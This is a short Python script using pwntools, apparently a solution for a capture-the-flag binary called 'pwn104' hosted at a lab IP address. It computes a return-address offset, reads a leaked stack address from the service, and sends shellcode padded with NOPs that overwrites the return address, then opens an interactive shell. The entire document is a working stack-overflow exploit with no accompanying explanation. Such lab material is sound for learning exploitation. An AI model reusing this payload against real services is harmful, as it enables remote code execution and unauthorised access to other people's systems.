from pwn import *

def find_rip(payload):
    p = process(exe)
    p.sendline(payload)
    p.wait()                    # wait process to crash
    rip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) # x64
    info('located RIP offset at {a}'.format(a=rip_offset))

exe = './pwn104'
elf = context.binary = ELF(exe) # will exec checksec
context.log_level = 'debug'     # a lot of debug info

#offset = find_rip(cyclic(200))
#exit()
offset = 88

#p = process(exe)                # start program
p = remote('10.10.234.135', 9004)
p.recvuntil(b'for you at ')
addr = p.recvline().strip()     # leak adress of local_58
info('leaked addr at {a}'.format(a=addr))

payload = asm(shellcraft.sh())  # put shellcraft at beginning of local_58
payload += (offset - len(payload)) * asm('nop') # pad with nop
payload += p64(int(addr, 16))   # put addr of local_58 (aka shell) at offset 88

write('payload', payload)

p.sendline(payload)
p.interactive()

